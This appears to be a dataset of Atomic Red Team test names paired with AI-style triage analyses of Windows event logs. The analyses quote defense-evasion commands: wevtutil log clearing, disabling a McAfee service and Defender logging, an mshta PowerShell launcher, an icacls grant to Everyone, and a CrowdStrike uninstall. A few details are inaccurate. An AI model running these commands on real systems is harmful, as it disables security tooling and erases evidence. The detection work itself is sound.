   - The `wevtutil` command is suspicious as it appears to automate the process of clearing different Windows event logs, further supporting potential intent to hide malicious activities.

4. **Launches from Suspicious Directories:**
   - Processes are executing from temporary directories (especially notable in handling updates), which can be suspicious if not part of normal software update processes.

5. **Presence of Atomic Red Team References:**
   - **Sysmon Log:** 
     - Execution chain involves paths pointing to the `AtomicRedTeam` framework. Although often used for legitimate security testing, without authorization, its presence might suggest malicious activity to simulate or execute attack techniques.

### Assessment and Conclusion:

The combination of cleared event logs, execution of potential UAC bypass tools, and the use of the `wevtutil` tool under high privilege access to clear logs suggest an intent to cover up actions that might compromise the integrity and security of the system. The utilization of `cmd.exe` with a path indicative of a UAC bypass tool is particularly concerning.

Given these indicators, the situation assessed from these logs points toward a compromised system.

"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","The logs provided show a sequence of events that indicate potentially suspicious behavior related to the installation and modification of the KeyScrambler software. Here are the key findings from the analysis:

1. **PowerShell Script Execution**:
   - There are PowerShell script logs that suggest the downloading, installation, and execution of KeyScrambler software from an official website. While KeyScrambler is a legitimate software designed for keystroke protection, the method of installation, which includes copying executables to a temporary directory and potentially using modified DLLs (`KeyScramblerIE.dll`), raises concerns about potential misuse.
   - Specifically, the script mentions copying and possibly modifying the `KeyScramblerIE.dll`, which can be a target for DLL hijacking or other malicious activities.

2. **Log File Clearing**:
   - There are events indicating the clearing of multiple log files, including Windows PowerShell, System, and Security logs. These actions were performed by the user `admin_test`, which is often a tactic used by attackers to cover their tracks. This is typically considered malicious behavior, especially if there is no legitimate reason for an administrator to clear logs during routine operations.

3. **Sysmon Events**:
   - The Sysmon logs show the execution of several processes, including `DriverInstaller.exe` related to KeyScrambler, which were executed shortly after the PowerShell script. These processes were issued with various command-line arguments, which might be part of the installation process.
   - Events relating to the use of `regsvr32.exe` to unregister and then re-register a DLL (`KeyScramblerIE.dll`) are noteworthy. This can potentially alter the behavior of the software or allow a modified version to execute, leading to a possible compromise of the host system.

4. **Timing and Consistency**:
   - All activities, including downloading, installation, and log clearance, are very close in timing. This closeness in timing is typical of automated scripts run with a particular goal, which, in this case, seems to be geared towards setting up and potentially exploiting installed software (KeyScrambler).

1. **Command Line Execution and Scripting**:
   - There are events where `cmd.exe` is used to execute `mshta.exe` with a VBScript command to run a PowerShell script located in a temporary directory: 
     ```
     ""CommandLine"":""\""cmd.exe\"" /c mshta vbscript:Execute(\""CreateObject(\""\""Wscript.Shell\""\"").Run \""\""powershell -noexit -file C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.005\\src\\powershell.ps1\"":close\"")""
     ```
   - The use of `mshta.exe` to run scripts can be considered suspicious as it is often used in Living-off-the-Land Binaries (LoLBins) attacks. This technique is associated with executing malicious scripts without leaving many traces.

2. **Event Log Clearance**:
   - There are multiple entries indicating the clearing of event logs across different channels:
     - System log was cleared by `admin_test`.
     - Windows PowerShell and Security logs were cleared shortly after each other.
   - Clearing of logs can be a strong indicator of malicious activity, intending to hide traces of previous actions.

3. **Suspicious Process Chains**:
   - The process creation chain involving `mshta.exe`, `powershell.exe`, and the script execution is indicative of potentially harmful behavior usually associated with attempts to execute scripts that could lead to system compromise or post-exploitation activities.

4. **Usage of Legitimate Tools for Execution**:
   - `wevtutil.exe` is used multiple times to clear logs, as suggested by the command line:
     - `""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`
   - This shows sophisticated knowledge, as these tools are part of Windows utility software but used here for activities that can be linked to malicious intent.

**Conclusion and Recommended Resolution: MALICIOUS**

The observed behaviors, particularly the execution of scripts using LoLBins, systematic clearing of event logs, and the specific chain of command executions, strongly suggest malicious activity. Immediate action should be taken to investigate further:

Disable Arbitrary Security Windows Service,"Upon analyzing the provided Windows event logs, several indicators of potentially malicious activity were observed. Let's detail the suspicious and potentially malicious findings:

1. **Event Log Clearing**:
   - The logs show that the event logs for several channels (System, Security, and Windows PowerShell) were cleared by the user `admin_test`. This is indicated by the following events:
     - System Log cleared (Event ID 104)
     - Security Log cleared (Event ID 1102)
     - Windows PowerShell Log cleared (Event ID 104)
   - Log clearance activities generally are a red flag for malicious behavior, indicating an attempt to cover up unauthorized or suspicious activities carried out on the system.

2. **Service Manipulation**:
   - There is a command execution via `cmd.exe` that stops and disables a security service, indicated by:
     - `""cmd.exe"" /c net.exe stop McAfeeDLPAgentService & sc.exe config McAfeeDLPAgentService start= disabled`
   - Stopping a security service like McAfee DLP Agent is a clear indicator of malevolent intent, as it is likely an attempt to disable security measures that would otherwise prevent or detect malicious activities.

3. **Unusual Use of `wevtutil.exe`**:
   - There is repeated usage of `wevtutil.exe` to clear event logs. The pattern of using this tool to clear logs aligns with the attempt to cover tracks following unauthorized activity or analysis of system and security logs.

4. **Frequent Execution of System Utilities**:
   - `whoami.exe`, `hostname.exe` and `svchost.exe` were executed frequently in a short period.
   - While execution of these utilities can be benign, given the context of log clearing and service manipulation, this activity can point toward reconnaissance efforts typically associated with a probing or preparation phase of an attack.

**Assessment**:
Combining the activities of event log clearing, disabling of security services, and suspicious execution of system utilities, these logs show strong indicators of potentially malicious activities. Such actions are common tactics to evade detection post-compromise.

LockBit Black - Disable the ETW Provider of Windows Defender -Powershell,"**Analysis of Windows Event Logs:**

### Findings

Upon reviewing the logs provided, several points of concern indicate potentially malicious behavior:

1. **Log Clearing Events:**
   - Multiple events show that `wevtutil.exe` was used to clear logs: 
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl ""Windows PowerShell""`

   This command is indicative of an attempt to cover tracks. Normal operations do not require evidence removal through log deletion.

2. **PowerShell Command Execution:**
   - A PowerShell script was used to disable Windows Defender logging:
     - `New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled -PropertyType DWord -Value 0 -Force`

   Disabling Windows Defender logging suggests an attempt to reduce detection by defensive tools.

3. **Execution Context:**
   - Activities like log clearing and PowerShell commands were executed by the user `admin_test`, which indicates that the attacker might have obtained admin credentials.

4. **Time Alteration:**
   - Time change events (`Event ID: 4616`) were observed. Although changes are not inherently malicious, in this context, they might be used to manipulate timestamps of activities.

5. **Frequent Process Launch with Elevated Privileges:**
   - The execution of `wevtutil.exe` and multiple instances of `conhost.exe` from high integrity levels.

6. **Pattern of Using Built-in System Utilities:**
   - Usage of utilities like `whoami.exe`, `hostname.exe`, and `svchost.exe` might be consistent with reconnaissance activities to gather system information discreetly.

7. **Edge Update Service Activity:**
   - Frequent execution of Microsoft Edge Update and related components, while these might be legitimate system updates, the frequency is notable and should be reviewed to confirm authenticity.

### Assessment

The series of actions captured in the logs exhibit multiple indicators of compromise, including unauthorized log clearing, security tool circumvention, and possibly time-stamping manipulation. The behavior suggests an intra-system reconnaissance and attempt to obscure tracks.

### Risks and Mitigation

DLL Side-Loading using the dotnet startup hook environment variable,"Upon analyzing the provided Windows event logs, several details emerge that may indicate suspicious or potentially malicious activity:

1. **Event Log Clearing**: 
   - The `Security log` shows a `Security Event ID 1102`, indicating logs have been cleared. Clearing event logs can be an indicator of malicious activity, possibly to cover tracks after unauthorized actions.
   - Similarly, in the `System log`, `EventID 104` indicates that the System and Windows PowerShell logs have also been cleared. Log clearing by an admin account, especially without a clear maintenance window, is often suspicious.

2. **Suspicious Command Execution**:
   - The `Sysmon log` reveals the execution of `wevtutil.exe` with the `cl` (clear log) attribute targeting multiple logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, `Windows PowerShell`). This is executed by the user `SERVER002\\admin_test`. This is consistent with intentional log clearing observed in Event IDs 1102 and 104.

3. **PowerShell Activity**:
   - There is an execution of PowerShell, noted as `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` by the `admin_test` user in the `Sysmon log`. Although not inherently malicious, the PowerShell execution paired with log clearing is noteworthy and aligns with common tactics in more advanced attacks for obfuscation.

4. **Command Line Utility Use**:
   - Multiple instances of `conhost.exe` (Console Window Host) and `cmd.exe` running with unusual command lines, including operations like setting environment variables typically seen in attack scenarios leveraging utilities like `dotnet`. Although legitimate software generates many of these entries, the combination with attempts to load a .dll (`preloader.dll` tied to MITRE ATT&CK T1574.002) points to potential exploitation or a test run.

5. **Miscellaneous Executables**:
   - Numerous instances of standard Windows executable operations (e.g., `hostname.exe`, `whoami.exe`) could suggest reconnaissance activity. If unexpected or frequent, it may indicate an adversary attempting to gather environment information.

**Assessment:**

Given the intentional clearing of logs, combined with suspicious `PowerShell` usage and the presence of commands resembling exploitation techniques, it strongly suggests potential malicious activity. The apparent focus on log cleaning and potential obfuscation tactics should be of concern.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate review of user access logs to verify the `admin_test` account's use and legitimacy.
- Perform a system integrity check and consider additional monitoring.
- Examine external connectivity records to check for potential data exfiltration.

Malicious process Masquerading as LSM.exe,"### Analysis

Upon reviewing the logs from the Windows host, the following potentially suspicious activities can be highlighted:

1. **Event Log Clearing:**
   - Security event log `1102` indicates that the security logs were cleared. The user `admin_test` executed the `wevtutil.exe cl Security` command as indicated in the Sysmon log. Clearing event logs can be a sign of malicious activity, as it is often used to cover tracks after unauthorized actions.

2. **Process Execution:**
   - Multiple executions of `wevtutil.exe` for clearing logs (`cl System`, `cl Application`, and `cl ""Windows PowerShell""` commands) executed by `admin_test`. This indicates a deliberate action to clear multiple logs, which is highly unusual and suggests an attempt to hide some activity.
   - A suspicious process was spawned: `C:\Windows\System32\cmd.exe` was used to copy itself to `C:\lsm.exe` and execute a command which output to `T1036.003.txt`. This behavior is a good example of process injection and masquerading (T1036.003 refers to an ATT&CK technique for Masquerading: Rename System Utilities).

3. **Unauthorized Credential Access:**
   - The event logs show `EventID 5379`, which depicts unsuccessful attempts to access stored credentials using ""ReadOperation"". Such failed attempts to retrieve credentials can be anomalous and may suggest reconnaissance or initial steps in a compromise.

4. **Command Usage and Execution:**
   - Processes such as `whoami.exe` and `hostname.exe` alongside `cmd.exe` and console host processes (`conhost.exe`) suggest command line activity, potentially used for system enumeration or customization, further indicating that an unauthorized user might be trying to gather information about the system's environment.

5. **Timing of Events:**
   - The sequence of events, including log clearances and credential access attempts, all occurring around the same time frame, indicates a coordinated effort to both acquire unauthorized access and hide traces of such activity.

### Conclusion

Based on the log assessments:

- **Malicious Indicators:**
  - The deliberate clearing of logs by `admin_test`.
  - The execution of commands that suggest masquerading and possibly preparation for persistent presence (e.g., copying and executing `lsm.exe`).
  
These events collectively suggest attempts to conduct malicious activities such as hiding traces and masquerading system utilities to confuse defenses.

### Resolution: MALICIOUS

Given the clear signs of log tampering, suspicious process execution, and failed credential access, the actions are malicious. Immediate response actions should include:

1. **Containment:**
   - Isolate the affected host from the network to prevent further spread of any potential threat.

2. **Investigation:**
   - Conduct a full forensic investigation on the host to determine the extent of compromise and identify any malware or tools used by the attacker.

3. **Remediation:**

   - Update all systems and re-check security configurations and policies to enhance defenses.

4. **Improvement:**
   - Review and reinforce security monitoring and alerting mechanisms based on the findings to prevent future occurrences."
Flush Shimcache,"After analyzing the provided Windows event logs, here are the findings:

1. **Event Log Clearing (Security and System)**
   - Security Log Entry with EventID 1102 indicates the security log was cleared by the user `admin_test`. Similarly, System Log Entries with EventID 104 indicate the clearing of the system logs. The command executed to clear these logs involved `wevtutil.exe`.
   - Frequent log clearing can be suspicious, as it may indicate an attempt to hide malicious activity. However, it might also be a regular maintenance action by an administrator. The context of this action needs further investigation to determine intent.

2. **Usage of `wevtutil.exe`**
   - Multiple occurrences of `wevtutil.exe` are seen within a short time frame, particularly targeting channels like ""Security"", ""System"", and ""Windows PowerShell"".
   - Clearing multiple log files in quick succession can be indicative of malicious activity, especially if this is not a part of routine operations.

3. **Command Execution through Rundll32 and Cmd**
   - Sysmon logs show a `cmd.exe` process executing `Rundll32.exe` with a command involving `apphelp.dll,ShimFlushCache`. Rundll32 executing arbitrary DLL functions can be suspicious because it is often used by attackers to execute code.

4. **Normal Software Update Activity**
   - A series of processes related to Microsoft Edge Update, including `MicrosoftEdgeUpdate.exe` and related setup processes, are recorded. These entries seem to show normal update operations from Microsoft Edge, without any unusual parameters or behavior.

**Assessment:**

- The evidence suggests potentially suspicious activity due to the frequent log clearing and anomalous use of `cmd.exe` and `Rundll32.exe`. The context of the execution is necessary to establish intent, as authorized users might undertake similar actions during legitimate maintenance tasks or troubleshooting.

**Resolution: SUSPICIOUS**

**Guidance:**
- Investigate the user `admin_test` to determine if they had the intent and authorization to clear logs.
- Analyze historical activity patterns for `admin_test` to discern if such log clearances are usual.
- Perform a detailed review of the environment for additional indicators of compromise.
- Increase monitoring on this host to detect any further suspicious activities.
- Consider securing event logs and maintaining a watched audit trail to prevent unauthorized log clearances in the future."

Clearing of logs, especially Security logs, can be generally suspicious as it is often an action taken by attackers to cover their tracks after gaining access to a system or executing malicious activities.

2. **Use of WEVTUTIL.EXE**:
   - There are several entries related to the use of `wevtutil.exe` to clear logs (System and Sysmon logs). This command-line utility is specifically used for event log management, including clearing logs, which aligns with potentially malicious behavior if done without legitimate administrative tasks to back it up.

3. **Reg.exe Command for Registry Manipulation**:
   - Registry entries under `HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client` were deleted using `cmd.exe` and `reg.exe`. Deleting these registry entries could potentially be used to remove traces or artifacts of RDP (Remote Desktop Protocol) connections, which can be an attempt to obscure a trail of remote access activity on a host.

4. **Suspicious Command Execution**:
   - The command sequence involving `cmd.exe` and `wevtutil.exe` is suspicious as it does more than a routine update process, involving direct log manipulation and registry modifications.

5. **PowerShell Activity**:
   - Though the log entries mention PowerShell, the corresponding part of the log is missing or empty. This is noteworthy because PowerShell is often used for both administrative tasks and various attack scenarios.

6. **EdgeUpdate Activity**:
   - There are numerous `Sysmon` events involving the Microsoft Edge Update process. While updates can be benign, their pattern alongside other suspicious activities may indicate they are being used as a cover or as part of a larger chain of actions without more context on their necessity or legitimacy.

Recommendations:
- Cross-reference the `admin_test` user activity logs and verify the legitimacy of actions executed under this account.
- Investigate whether there was any context, service tickets, or maintenance events that could explain log clearing activities.
- Inspect system integrity and user accounts for signs of compromise, including auditing logs leading up to this chronology for anomalies.
- Consider isolating the affected system if unexplained anomalies persist, and performing malware scans and digital forensic analysis to further understand the scope of any breach.

Final Assessment: **MALICIOUS**

The combination of log clearing activities, registry manipulations, and the presence of elevated and script-like executions strongly suggests unauthorized and potentially malicious activity. Immediate response is needed to address the potential compromise."
Running DLL with .init extension and function,"Upon analyzing the provided Windows event logs, several suspicious activities were identified:

1. **Event Log Clearing Attempts:** 
   - Multiple logs, including the System, Windows PowerShell, and Security logs, were cleared around the same timestamp (16:49:12 on October 26, 2024), as indicated by Event IDs 104 (System), 104 (Windows PowerShell), and 1102 (Security). Log clearing is often used to cover tracks after unauthorized changes are made, making this activity automatically suspicious.

2. **Suspicious PowerShell Execution:**
   - There are multiple PowerShell events with Event ID 600 showing ""rundll32.exe"" executing a file from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\bin\_WT.init,krnl`). The use of rundll32.exe in this manner, especially pointing to temporary directories and known threat simulation frameworks like Atomic Red Team, is a common technique used by attackers to execute unauthorized code stealthily.

3. **Use of `wevtutil.exe`:**
   - `wevtutil.exe`, the Eventing Command Line Utility, is executed multiple times to clear event logs (as seen in Sysmon log entries with Event ID 1). This tool is used to manage Windows Event Log services, but its use here aligns with the log-clearing entries, reinforcing the possibility of malicious intent.

4. **Execution of Known Threat Tools:**
   - The presence of Atomic Red Team artifacts in the logs indicates the likely presence of penetration testing tools, which could be used either by malicious actors or authorized personnel performing a security assessment. The context here does not specify legitimate use, making this activity concerning.

5. **Command Execution with `cmd.exe` and `rundll32.exe`:**
   - Exec Command: `""cmd.exe"" /c rundll32.exe C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\bin\_WT.init,krnl` appears in the logs. This pattern, especially executing via `cmd.exe`, suggests potential unauthorized execution attempts.

Based on these observations, the logs indicate a series of actions commonly associated with malicious activity. These actions include:
- Log file clearing to cover tracks
- Execution of scripts and binaries from temporary directories
- Use of known Pentesting/Red Team tools

**Assessment:** Given the presence and context of these activities, I am confident that these logs indicate **MALICIOUS** activity.

**Guidance:**
- Immediately review access control logs and any other security monitoring systems to identify how this compromise occurred.
- Ensure remediation steps are taken, including possibly isolating affected systems.
- Conduct a thorough investigation and possibly a forensic analysis to understand the full scope of compromise.
- Review user activity and authentication logs to verify if any legitimate users or credentials were used maliciously.
- Strengthen logging and monitoring procedures to detect similar activities in the future and ensure logs are regularly reviewed for anomalies."
Execution from Compressed JScript File,"### Analysis

Upon reviewing the provided logs, there are several events indicating suspicious activities which could potentially be malicious:

1. **Event Log Clearing**:
   - Multiple instances of event logs being cleared (System, Windows PowerShell, Security). The events with EventID `104` in the System log and `1102` in the Security log show logs being cleared by the user `admin_test` using `wevtutil.exe`, which can be a sign of malicious actions trying to cover tracks.

2. **Execution of Suspicious Commands**:
   - The execution of `cmd.exe` with a suspicious command `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""` indicates the execution of a script from a temporary location, often associated with testing or malicious payloads. This particular path and execution pattern is indicative of activities often used in attack simulation frameworks like Atomic Red Team, which adversaries might mimic for malicious intent.

3. **Use of Windows Scripting Host**:
   - The execution of `wscript.exe`, especially associated with files in `ExternalPayloads` directories, often flags for potential execution of malicious scripts. This is aligned with EventRecordID `17961` in the Sysmon log, further solidifying potential malicious behavior.

4. **Execution of System Utilities with High Privileges**:
   - Various system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) are executed with high integrity levels by `admin_test`. While these utilities can be used legitimately, the context of their execution and the rapid succession of these events adds to the suspicion level, as seen per the `IntegrityLevel` field showing `High` for many of these processes.

5. **Miscellaneous Observations**:
   - Multiple failed credential accesses in the Security log (EventID `5379`) suggest odd behavior, yet they do not conclusively hint at a direct threat without further context.

### Assessment

Based on the reviewed logs, the following suspicions stand out:

- The clearing of event logs is a strong indicator of an attempt to cover tracks, potentially after performing unauthorized or malicious activities.
- The execution of scripts from temporary directories is unusual and suggests non-standard operations, potentially harmful.
- The usage of various Windows utilities in a rapid sequence by an administrative user could suggest automated malicious operations attempting to blend in with normal system activities.

### Resolution

**Resolution: SUSPICIOUS**

While there are substantial indications of potentially malicious activities due to log clearing, script executions, and unusual usage of system utilities, the evidence isn't overwhelmingly conclusive for malicious verdict without further context such as network activity, user intent verification, or confirmation of harmful payload execution.

### Guidance

Further investigation is warranted to confirm or dismiss the suspicion:
- **Review user actions**: Validate the actions of `admin_test` during the timeframe of these logs.
- **Analyze file changes**: Examine the contents of `AtomicRedTeam` and `ExternalPayloads` directories for known malicious indicators.
- **Check network logs**: Look for unusual outgoing connections corresponding with script executions or cleared log timestamps.
- **Monitor and add alerts**: Establish monitoring for similar activities, especially focusing on event log clearing and unexpected script executions.
- **Ensure system integrity**: Run a full antivirus scan and use endpoint detection tools to check for known threats or indicators of compromise."
Office 365 - Exchange Audit Log Disabled,"Let's examine the provided logs for any suspicious or malicious activity:

1. **Log Clear Events:**  
   - **System and Security Logs Cleared:** Both system and security logs have events indicating that logs were cleared (EventID 104 and 1102, respectively). This is often a sign of malicious activity, particularly if there is no legitimate reason for clearing logs. The user ""admin_test"" carried out these operations.

2. **Suspicious PowerShell Activity:**  
   - **PowerShell Event Logs:** The logs show PowerShell commands being run using obfuscated scripts to establish connections and manipulate configurations. The script attempts to establish a connection to Exchange Online with suppressed logging, indicated by `Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False`. Concealing audit logs is a common tactic in malicious activities to avoid detection.

3. **Sysmon Logs Analysis:**  
   - **wevtutil Usage:** The utility `wevtutil.exe` is used multiple times to clear logs (`cl` stands for clear log) like Microsoft-Windows-Sysmon, Application, Security, and Windows PowerShell. The command execution context is from paths involving the user ""admin_test"", which further ties back to the suspicious activity of log clearing, showing a pattern of log tampering.

4. **Security Log Events:**  
   - **User and Group Enumeration:** There are multiple events related to enumeration of users and groups (EventID 4798 and 4799), which could indicate an initial reconnaissance phase in a potential attack. This type of activity might be used by attackers to gather information about available accounts and groups to escalate privileges further.

5. **Activities by CompatTelRunner.exe:**
   - This legitimate Microsoft process is seen executing suspicious tasks, such as enumerating local user accounts. While normally benign, in the context of all other suspicious activities, its behavior aligns with potential abuse or hijack by malicious scripts for reconnaissance.

**Assessment Summary:**
The combination of cleared logs, PowerShell execution with suppression of audit logs, usage of `wevtutil` for clearing critical logs, and enumeration of users and groups point towards malicious activity. These actions are indicative of an attempt to cover tracks and possibly elevate privileges or persist in the environment.

**Resolution: MALICIOUS**

**Recommended Actions:**
- **Immediate Isolation:** Isolate the affected host to prevent further misuse of credentials or lateral movement within the network.
- **Thorough Investigation:** Conduct a deep dive forensic analysis to gain more insights into the extent of the compromise, including memory analysis and deeper network logs inspection.
- **Change Credentials:** Promptly reset credentials for ""admin_test"" and potentially other users to limit further unauthorized access.
- **Audit and Strengthen Security Controls:** Ensure auditing is properly configured and centralized logging is in place to avoid tampering. Enhance endpoint protection measures to detect and mitigate such activities in the future."
Event Log Manipulations- Time slipping via Powershell,"After a thorough analysis of the provided Windows event logs, several indicators suggest potential malicious activities:

### Indicators of Malicious Activity:

1. **Log Clearing Events:**
   - **Clearing of Event Logs:** 
     - **Sysmon Logs:** Multiple instances of the Windows event logs being cleared are captured. For example, within the `EventID 104` and `EventID 1102` entries, logs from the System and Security channels have been cleared by the `admin_test` account.
     - **Security Logs:** The EventID 1102 indicates the clearing of security logs, which is a known behavior for covering tracks after malicious activities.

2. **Suspicious PowerShell Activity:**
   - **PowerShell Script Execution:**
     - A PowerShell command was executed to change the system date (`Set-Date -Date (Get-Date).AddDays(3)`) and potentially record this alteration (`Add-Content ""$env:APPDATA\slipDays.bak"" 3`). This activity can be associated with attempts to evade detection or manipulate file timestamps.

3. **Time Manipulation:**
   - **Time Change Events:**
     - There are several EventID 4616 logs that show changes in system time using PowerShell. This could be considered an anomaly, indicating attempts to manipulate log timelines or to evade scheduled security tasks.

4. **Process Execution Analysis:**
   - **Use of System Tools (Event log utilities like wevtutil):** The frequent invocation of `wevtutil.exe` to clear different logs such as System, Security, and Application indicates an attempt to remove traces of certain activities.
   - **Unusual Commands:**
     - Unusual command-line arguments passed to various system utilities (e.g., `wevtutil`, `PowerShell`) observed in the logs could indicate scripting of malicious actions.

### Threat Assessment and Resolution:
Given the evidence of potential malicious behavior, such as log clearing, time manipulation, and unusual PowerShell script execution, there is a considerable suspicion of compromise. The actions align with techniques often used by attackers to hide traces and alter system conditions.

**Resolution: SUSPICIOUS**

### Recommendations for Further Investigation:
- Immediately halt the `admin_test` account's privileges and review access logs to identify origin and intent.
- Conduct a deeper forensic analysis involving other system files, configurations, and network communications to determine the extent of compromise.
- Review security policies regarding PowerShell use and implement stricter preventive measures like logging, script execution restrictions, and just-in-time (JIT) access controls.
- Consider isolating the affected machine from the network until a more thorough investigation is completed and the system's integrity is confirmed.

The analysis suggests the need for a comprehensive review of security policies and practices on this host."
Grant Full Access to folder for Everyone - Ryuk Ransomware Style,"### Log Analysis:

**Anomalous and Suspicious Activities:**

1. **Log Clearing Activity:**
   - The logs indicate that the Windows event logs were cleared as evidenced by:
     - Application log cleared (EventID: 1102) by `admin_test` (EventRecordID: 30350).
     - System log entries showing multiple log clearings (EventID: 104), one for the ""System"" channel and another for ""Windows PowerShell"" channel, both done by `admin_test`.

2. **Command Execution:**
   - A command was executed using `cmd.exe` with an argument to alter file permissions: 
     - `""cmd.exe"" /c icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q`. This command grants full control permissions to the ""Everyone"" group, recursively through all directories and subdirectories in the `C:\Users\Public\` folder. This action can potentially expose sensitive files and data to unauthorized users or processes.

3. **Use of Windows Event Viewer Utility:**
   - `wevtutil.exe` was used to clear the Sysmon logs with the command: `C:\Windows\system32\wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` and `cl` commands to clear various logs, indicating an attempt to cover tracks.

**Potential Indicators of Malicious Activity:**
- The clearing of event logs, including Security and System logs, is a well-known tactic used by attackers to hide their activities from forensic investigations.
- The execution of a command to change file permissions widely is an unusual activity that might be part of post-exploitation attempts, such as maintaining persistence or facilitating further exploitation.
- The Sysmon logs show multiple executions of `wevtutil.exe`, combined with a high integrity level, indicating elevated privileges were used.

**Assessment:**
- **Log Clearing:** Suspect actions associated with `admin_test` indicate an intent to obscure activities. Log clearing is considerably rare for legitimate actions unless followed by documentation or policy-driven maintenance.
- **Privilege Modifications:** The granting of full permissions to Everyone is typically not a benign administrative task given its security implications without proper authorization.
  
### Resolution:

- **MALICIOUS**: The logs contain clear indicators of malicious activity. There is evidence of log clearing activities by `admin_test`, which suggests an attempt to hide malicious activities. Additionally, the unauthorized permission changes can lead to potential data exposure or system compromise.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further potential malicious activities and spread.
   - Conduct a full forensic analysis to identify additional traces of compromise and determine the extent of unauthorized activities.
   - Review and potentially change credentials and access permissions associated with the account `admin_test` to secure against further unauthorized access.
   - Assess other systems for similar artifacts or signs of compromise.

2. **Short-term Remediation:**
   - Reinstate cleared logs if possible through backups or shadow copies to reconstruct the timeline of events.
   - Revert any unauthorized permission changes and review file integrity.

3. **Long-term Strategies:**
   - Implement stringent monitoring and detection mechanisms for sensitive activities such as log clearing and permission changes.
   - Improve user access and privilege management, ensuring a principle of least privilege is adhered to.
   - Ensure comprehensive and regular security training for users on recognizing and responding to potentially malicious activities. 

It's critical to maintain heightened vigilance and consider engaging with incident response experts to assist with containment and recovery processes."
Activate Windows NoTrayContextMenu Group Policy Feature,"Upon reviewing the provided logs, several points of interest emerge, indicating potential malicious activity. Here are the key observations:

1. **Log File Clearing**: 
   - The logs reveal multiple entries indicating the clearing of critical logs (`Sysmon`, `System`, `Security`, and `Windows PowerShell`). Event IDs 104 (System Log) and 1102 (Security Log) suggest that these logs were cleared by the user `admin_test`. Clearing logs is typically a tactic used by malicious actors to cover their tracks after carrying out unauthorized activities or attacks.

2. **Process Execution**:
   - A series of `wevtutil.exe` processes were executed with the command lines intended to clear various logs (e.g., clearing `Microsoft-Windows-Sysmon/Operational` and `Application`). These operations were carried out under high integrity, indicating administrative privileges. The persistent use of `wevtutil` in such a manner is often a red flag.

3. **Registry Modification**:
   - The execution of `cmd.exe` with a command to modify the registry (`reg.exe` command) to set `NoTrayContextMenu` is indicative of potentially malicious activity. This change can disable context menus in Explorer and may be enacted to hinder user interaction and conceal ongoing malicious operations.

4. **Unusual Time Change**:
   - There are `Kernel-General` and `Security-Auditing` events indicating a system time change, likely indicating efforts to disrupt timeline analysis or affect entries in logs, another common tactic used by attackers.

5. **Use of Built-in Tools**:
   - Usage of tools like `hostname.exe`, `whoami.exe` further confirms the actor's intention to gather system information. While not inherently malicious, their execution in proximity to other suspicious activities raises concerns.

Considering these observations, the evidence strongly suggests the presence of malicious activities designed to obfuscate actions or maintain persistence on the compromised host.

**Assessment**: MALICIOUS

**Recommendations**:
- Investigate the `admin_test` user account for unauthorized access and changes.
- Conduct a thorough forensic analysis of Server002.
- Restore and review the logs if possible, particularly the cleared logs, to determine the scope and nature of the compromise.
- Examine network traffic around the time of these incidents for additional malicious activity.
- Strengthen system monitoring and enable advanced threat hunting practices to detect similar activities in the future.

Immediate action should be taken to quarantine the affected systems and perform incident response and recovery procedures."
Uninstall Crowdstrike Falcon on Windows,"Upon analyzing the provided Windows event logs from the host `Server002`, I have identified the following indicators of potential malicious activity:

1. **Security Log (Event ID 1102)**: 
   - The event indicates that the security log was cleared by the user `admin_test`. This is often a red flag as malicious actors commonly do this to cover their tracks.

2. **Sysmon Log (Process Execution with Command Line Usage)**:
   - Several instances of `wevtutil.exe` were used to clear event logs from different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This behavior is highly suspicious, as clearing logs is not typical behavior for legitimate, automated tasks by system administrators, especially from multiple channels in a short time frame.

3. **Sysmon Log (PowerShell Script Execution)**:
   - The logs indicate a suspicious PowerShell command attempting to uninstall `WindowsSensor.exe` if it is signed by `CrowdStrike, Inc.`. This potentially indicates an attempt to remove an endpoint protection agent, which is a common tactic used by adversaries to disable security mechanisms.

Based on these findings, there is a clear indication that someone with administrative access either purposefully or unknowingly performed actions typically associated with malicious activity. The pattern of log clearing across various stipulations and the PowerShell script execution attempting to uninstall security software imply malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the host `Server002` from the network to prevent further potential malicious actions.
- Conduct a thorough investigation to determine how the actor gained access to perform these actions. Check for any unauthorized access to `admin_test` or associated privileged accounts.
- Verify the integrity of other systems and logs in the network for possible lateral movement.
- Recover event logs from backups if possible, and review any available logs that were not cleared for additional indicators of compromise.
- Reinforce log monitoring and implement alerts for activities such as log clearing and execution of suspicious PowerShell commands.
- Consider re-imaging affected systems and restoring them from a state prior to the compromise once the investigation is complete."

Create an Administratoruser (with a space on the end),"Based on an analysis of the provided Windows event logs, multiple indicators suggest malicious activity may have occurred on the system.

### Suspicious Behavior Identified:
1. **Clearing of Event Logs**:
   - Multiple entries suggest the clearing of important event logs: Security log (Event ID 1102) and System log (Event ID 104). This is often a tactic used by attackers to cover their tracks.

2. **Privilege Escalation and User Account Activity**:
